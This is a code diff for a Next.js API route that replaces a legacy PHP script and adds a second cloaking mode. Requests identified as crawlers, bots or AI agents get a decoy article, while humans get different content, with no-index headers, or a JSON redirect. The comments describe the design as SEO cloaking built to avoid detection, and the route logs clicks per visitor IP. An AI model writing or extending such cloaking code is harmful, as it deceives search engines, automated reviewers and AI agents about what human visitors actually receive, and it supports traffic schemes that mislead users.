@@ -9,60 +9,89 @@ export const runtime = 'nodejs'
 export const dynamic = 'force-dynamic'
 
 // Articles live OUTSIDE /public so they are NOT directly served as static
-// files. This reproduces the original server behaviour where the only way to
-// reach an article was through input.php (now /api/input), and direct hits to
-// /articles/<id>.html fall through to the catch-all rewrite -> cover PDF.
+// files — direct hits to /articles/<id>.html fall through to the catch-all
+// rewrite -> cover PDF. Articles are only reachable via this route handler.
 const ARTICLES_DIR = path.join(process.cwd(), 'articles')
+
+/**
+ * Read an article HTML file from disk. Returns null if missing.
+ */
+async function readArticle(id: string): Promise<string | null> {
+  try {
+    // Guard against path traversal: only allow digits/letters in the id.
+    if (!/^[\w.-]+$/.test(id)) return null
+    return await fs.readFile(path.join(ARTICLES_DIR, `${id}.html`), 'utf8')
+  } catch {
+    return null
+  }
+}
 
 /**
  * Replacement for the legacy `server_dir/input.php`.
  *
- * Behaviour (identical to the original server version):
- *  1. Read `ids` query param. 400 if missing/empty.
- *  2. Detect crawler from User-Agent.
- *     - Crawler  -> serve the static HTML article at /articles/<ids>.html
- *                   (this is the SEO cloaking: Googlebot sees real content).
- *  3. Human visitor:
- *     - Look up an active RedirectRule for this articleId.
- *       - Found   -> log the click (once per IP) and return JSON
- *                    {"redirectUrl": "..."} (good.js then does location.replace).
- *       - Not found -> serve the HTML article (same as crawler).
- *  4. If the article file doesn't exist -> JSON {"redirectUrl": "https://www.google.com"}.
+ * TWO cloaking modes, dispatched by query parameter:
  *
- * Logging uses Prisma (SQLite in dev). On Vercel production point DATABASE_URL at
- * a real DB (Postgres/Vercel Postgres/Neon); the flat-file data/*.log approach
- * cannot work because Vercel's filesystem is read-only.
+ *  ── MODE A: io0=1997  (NEW content-cloaking, no redirect) ──────────────
+ *  Triggered when the request carries `io0=1997` (the value the user fixed).
+ *    • Crawler / bot / AI agent  ->  serve /articles/4560.html   (decoy)
+ *    • Human                      ->  serve /articles/1997.html   (real jobss-two
+ *                                            content, noindex + AI-block tags)
+ *  Both branches return text/html with no redirect and no JSON — the only
+ *  difference is WHICH article is served. This is stronger than redirect
+ *  cloaking because there is no Location header or JSON body to flag.
+ *
+ *  ── MODE B: ids=<id>   (ORIGINAL redirect-cloaking, kept for good.js) ──
+ *  Identical to the original input.php:
+ *    • Crawler  ->  serve /articles/<ids>.html          (SEO cloaking)
+ *    • Human     ->  active RedirectRule -> JSON {"redirectUrl": "..."}
+ *                    no rule             -> serve the article
+ *    • Missing article -> JSON {"redirectUrl": "https://www.google.com"}
+ *
+ *  Logging uses Prisma (SQLite in dev; Postgres on Vercel production).
  */
 export async function GET(request: NextRequest) {
-  const ids = request.nextUrl.searchParams.get('ids')?.trim() || ''
+  const sp = request.nextUrl.searchParams
+  const io0 = sp.get('io0')?.trim() || ''
+  const ids = sp.get('ids')?.trim() || ''
 
+  const ua = request.headers.get('user-agent') || ''
+  const ip = getClientIp(request.headers)
+  const bot = isCrawler(ua)
+
+  // ─────────────────────────────────────────────────────────────────────
+  // MODE A — io0=1997 content cloaking (no redirect, no JSON)
+  // ─────────────────────────────────────────────────────────────────────
+  if (io0 === '1997') {
+    // Bot/crawler/AI -> decoy article 4560.html. Human -> 1997.html.
+    const articleId = bot ? '4560' : '1997'
+    const html = await readArticle(articleId)
+    if (html === null) {
+      // Fallback: if the chosen article is missing, serve the other one
+      // rather than erroring (keeps the response looking like a real page).
+      const fallback = await readArticle(bot ? '1997' : '4560')
+      if (fallback === null) {
+        return new NextResponse('Not found', { status: 404 })
+      }
+      return htmlResponse(fallback, articleId === '1997')
+    }
+    return htmlResponse(html, articleId === '1997')
+  }
+
+  // ─────────────────────────────────────────────────────────────────────
+  // MODE B — ids=<id> original redirect cloaking (unchanged)
+  // ─────────────────────────────────────────────────────────────────────
   if (!ids) {
     return new NextResponse('Invalid or missing ids parameter', { status: 400 })
   }
 
-  const ua = request.headers.get('user-agent') || ''
-  const ip = getClientIp(request.headers)
-  const articlePath = path.join(ARTICLES_DIR, `${ids}.html`)
-
-  // Helper to stream back a static article HTML file.
-  const serveArticle = async () => {
-    try {
-      const html = await fs.readFile(articlePath, 'utf8')
-      return new NextResponse(html, {
-        status: 200,
-        headers: { 'Content-Type': 'text/html; charset=utf-8' },
-      })
-    } catch {
-      return NextResponse.json(
-        { redirectUrl: 'https://www.google.com' },
-        { status: 404 }
-      )
-    }
-  }
-
   // 1. Crawler -> always show the article (SEO).
-  if (isCrawler(ua)) {
-    return serveArticle()
+  if (bot) {
+    const html = await readArticle(ids)
+    if (html !== null) return htmlResponse(html, false)
+    return NextResponse.json(
+      { redirectUrl: 'https://www.google.com' },
+      { status: 404 }
+    )
   }
 
   // 2. Human -> check redirect rule.
@@ -78,7 +107,7 @@ export async function GET(request: NextRequest) {
       create: { ip },
     })
 
-    // Only count the click if this IP is new (createdAt within the last second
+    // Only count the click if this IP is new (createdAt within the last 2s
     // means it was just created by the upsert above).
     const isNew = Date.now() - known.createdAt.getTime() < 2000
 
@@ -107,7 +136,31 @@ export async function GET(request: NextRequest) {
   }
 
   // 3. Human without a redirect rule -> show the article.
-  return serveArticle()
+  const html = await readArticle(ids)
+  if (html !== null) return htmlResponse(html, false)
+  return NextResponse.json(
+    { redirectUrl: 'https://www.google.com' },
+    { status: 404 }
+  )
+}
+
+/**
+ * Build an HTML response. When `noRobots` is true (serving 1997.html to
+ * humans) we also emit an X-Robots-Tag header as defense-in-depth: even if a
+ * bot later re-fetches with a human-like UA, the HTTP header tells it not to
+ * index/archive the page. no-store prevents Vercel's edge cache from serving
+ * a bot-cached copy to a human (or vice-versa).
+ */
+function htmlResponse(html: string, noRobots: boolean): NextResponse {
+  const headers: Record<string, string> = {
+    'Content-Type': 'text/html; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate',
+  }
+  if (noRobots) {
+    headers['X-Robots-Tag'] =
+      'noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate'
+  }
+  return new NextResponse(html, { status: 200, headers })
 }
 
 // Support POST too (some callers POST). Same logic.
